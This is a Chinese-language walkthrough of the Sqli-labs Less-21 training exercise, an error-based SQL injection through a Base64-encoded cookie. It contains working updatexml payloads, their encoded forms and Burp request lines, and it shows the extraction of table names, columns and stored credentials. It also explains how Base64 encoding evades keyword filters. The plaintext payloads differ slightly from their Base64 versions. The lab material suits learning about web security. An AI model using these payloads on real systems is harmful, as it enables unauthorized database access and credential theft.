## 题目: Sqli-labs Less-21

## 题目描述
本关的页面和 Less-20 类似，包含了 Username 和 Password 输入框。但在成功登录后，通过 F12 查看 Cookie 会发现，uname 的值不再是明文，而是一串以 = 结尾的乱码。
同时，页面的标题为 Cookie Injection - Error Based - complex - string。这说明注入点依然在 Cookie 中，并且经过了 Base64 编码处理，而且后台存在一定的过滤（complex）。

## 解题思路
因为 Cookie 被 Base64 包装，我们无法直接注入，必须先构造恶意 Payload，对其进行 Base64 编码，再替换到 Cookie 中。
同时，由于 HTTP 传输中 +、= 等符号容易引起解析问题，Base64 编码后的内容还需要做一次 URL 编码（如将 = 转为 %3D）。
通过测试（或者看源码）可知，后台的闭合方式并不是常规的，大概率是单引号加括号 ')。由于行尾的注释符（# 或 --+）极易在 Header 传输中被吞掉，最终我们采用 or ' 的逻辑补齐语法构造，实现无注释符的完美逃逸。

## 解题步骤
**1. 抓包与识别编码**
使用 admin/admin 登录后，刷新页面并在 Burp Suite 中抓取 GET 请求。观察请求头：
```text
Cookie: uname=YWRtaW4%3D
```
其中 YWRtaW4= 是 admin 的 Base64 编码，%3D 是 = 的 URL 编码。这证实了服务器期待接收 Base64 编码的数据。

**2. 构造 Payload 并进行双重编码**
以获取当前数据库名为例：

明文 Payload：
```text
admin') or updatexml(1,concat(0x7e,(select database()),0x7e),1) or (
```
Base64 编码后：
```text
YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yICgn
```
URL 编码后（将末尾的 = 替换）：
(如果 Base64 末尾有 =，记得转成 %3D)

**3. 发送注入请求**
在 Burp Suite 的 Repeater 中，将 Cookie 替换为编码后的 Payload：
```text
Cookie: uname=YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yICgn
```
回显现象：页面报错，黄字显示 XPATH syntax error: '~security~'。注入成功。

**4. 依次获取表名、列名与账号密码**
将以下 Payload 同样使用 Base64 编码和 URL 编码，替换 Cookie 发送：
表名：
```text
admin') or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) or (
```
列名：
```text
admin') or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) or (
```
账号密码：
```text
admin') or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) or (
```
回显现象：最终成功爆出账号密码 ~Dumb:Dumb~。

## 踩坑记录与复盘
* 编码链的复杂性：实战中，Cookie 被 Base64 包装很常见。我们必须熟练掌握 Payload 构造 -> Base64 编码 -> URL 编码 的三者切换。我一开始试图用 Python 脚本直接跑，但因为没做好 URL 编码（= 被吞），导致服务器解析失败，一直毫无回显。
* 注释符失效的妥协：在 HTTP Header（包含 Cookie）注入中，行尾的空格和换行极易被丢弃。我试过了用 # 和 --+，后台似乎直接无视了它们。最终放弃注释符，使用 or ' 补齐后方的闭合语法，这才是应对此类环境的有效手段。
* 数据污染：在查询 information_schema.columns 时，如果只加 table_name='users'，会把系统自带的表名也捞出来。标准姿势必须加上 and table_schema='security' 进行精准过滤。
* 环境玄学：在调试 Python 脚本时，一开始测出来的页面长度（1101）永远一样。原因在于后台无论怎么执行，页面顶部的 UI 模板长度是不变的，用长度对比法（布尔盲注）判断在这里完全失效，最终还是得靠报错注入。

## 知识点总结
* Cookie 注入：由于 Cookie 完全由客户端控制，且很多 WAF 对 Cookie 的检测不如 URL 严格，容易成为注入突破口。
* Base64 绕过：对注入 Payload 进行 Base64 编码，不仅能满足后端解码的需求，还能绕过简单的关键字黑名单拦截。
* Http 头部注释符失效：在 Header 传输时，# 和 --+ 可能失效。使用 or ' 或 and '1'='1 补齐闭合，是头部注入的必备技巧。
